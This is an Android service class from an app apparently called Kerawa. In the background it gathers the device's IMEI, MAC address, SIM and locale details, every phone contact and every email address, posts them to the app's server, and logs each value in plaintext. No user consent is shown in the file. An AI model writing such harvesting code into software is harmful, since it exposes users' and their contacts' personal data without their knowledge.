package com.kerawa.app.services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.AuthFailureError;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.kerawa.app.fragments.MySingleton;
import com.kerawa.app.utilities.AndroideDevice;
import com.kerawa.app.utilities.Kerawa_Parameters;
import com.kerawa.app.utilities.Krw_functions;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;

public class send_contacts extends IntentService {


    public send_contacts() {
        super("send_contacts");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        if (Krw_functions.isConnected(getApplicationContext())) {

           if(Krw_functions.can_send_contact(getApplicationContext())){
            Log.d("sending","started");
            JsonObjectRequest movieReq = new JsonObjectRequest(Request.Method.POST, Kerawa_Parameters.PreProdURL + "savedata/mobile", new Response.Listener<JSONObject>() {
                @Override
                public void onResponse(JSONObject response) {
                    // the response is already constructed as a JSONObject!

                    try {

                        JSONObject obj = response.getJSONObject("data");
                        if(obj.has("code"))
                        {
                           // Log.d("sending ","success");
                            int code = obj.getInt("code");
                            if (code == 200)
                            {
                                //update the shared preference
                                SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                                SharedPreferences.Editor editor = prefs.edit();
                                prefs.edit().remove("envois").apply();
                                editor.putLong("envois", System.currentTimeMillis());
                                editor.apply();
                                Log.d("sending ", "success");

                            }
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }
            },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            //errore.printStackTrace();
                            JSONObject json = null;

                            NetworkResponse response = error.networkResponse;
                            if (response != null && response.data != null) {
                                switch (response.statusCode) {
                                    case 500:
                                     Log.d("sending_error", new String(response.data));
                                        break;
                                    case 400:
                                     Log.d("sending_error", new String(response.data));
                                        break;
                                    case 405:
                                     Log.d("sending_error", new String(response.data));
                                        break;


                                }
                                //Additional cases
                            }

                        }


                    }) {

                @Override
                public Map<String, String> getHeaders() throws AuthFailureError {

                    Map<String, String> params = new HashMap<String, String>();
                    params.put("X-Kerawa-Api-Consumer-Key", new Kerawa_Parameters(getApplicationContext()).Hide_meta_data());


                    return params;
                }

                @Override
                public String getBodyContentType() {
                    // TODO Auto-generated method stub
                    return "application/x-www-form-urlencoded";
                }

                @Override
                public String getParamsEncoding() {
                    return "UTF-8";
                }

                @Override
                public byte[] getBody() {

                    Map<String, String> params = new HashMap<String, String>();

                    TelephonyManager telephonyManager = (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
                    String country = telephonyManager.getSimCountryIso();
                    String sim_operator = telephonyManager.getSimOperatorName();

                    Locale locale = Locale.getDefault();
                    String local_country = locale.getCountry();
                    TimeZone tz = TimeZone.getDefault();

                    if (country!=null) params.put("sim_country", country);else params.put("sim_country", "null");//most reliable
                    if (sim_operator!=null) params.put("sim_operator", sim_operator); else params.put("sim_operator", "null");
                    if (tz.getID()!=null) params.put("timezone",tz.getID());else params.put("timezone","null");
                    if (local_country!=null) params.put("local_country", local_country);else params.put("local_country", "null");
                    String emei = new AndroideDevice(getApplicationContext()).getImei();
                    if (emei!=null) params.put("imei", emei);else params.put("imei", "null");
                    WifiManager manager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
                    WifiInfo info = manager.getConnectionInfo();
                    if (info.getMacAddress()!=null) params.put("macaddress", info.getMacAddress()); else params.put("macaddress", "null");
                    JSONObject obj = new JSONObject();
                    JSONObject obj2 = new JSONObject();
                    Krw_functions.getAllPhoneContacts(getApplicationContext(),null,obj);
                    Krw_functions.getAllPhoneEmails(getApplicationContext(),obj2);
                    params.put("phones",obj.toString());
                    params.put("emails",obj2.toString());



                    return encodeParameters(params, getParamsEncoding());
                }

                private byte[] encodeParameters(Map<String, String> params, String paramsEncoding) {
                    StringBuilder encodedParams = new StringBuilder();
                    try {
                        for (Map.Entry<String, String> entry : params.entrySet()) {
                            encodedParams.append(URLEncoder.encode(entry.getKey(), paramsEncoding));
                            encodedParams.append('=');
                            Log.d("TAG_k", entry.getKey() + "=>" + "TAG_v" + entry.getValue());
                            encodedParams.append(URLEncoder.encode(entry.getValue(), paramsEncoding));
                            encodedParams.append('&');
                        }
                        return encodedParams.toString().getBytes(paramsEncoding);
                    } catch (UnsupportedEncodingException uee) {
                        throw new RuntimeException("Encoding not supported: " + paramsEncoding, uee);
                    }
                }
            };

            // Creating volley request obj

            // Adding request to request queue
            movieReq.setRetryPolicy(new DefaultRetryPolicy(
                    10000,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            MySingleton.getInstance(getApplicationContext()).addToRequestQueue(movieReq);



        }
            else stopSelf();
    }

    }
}
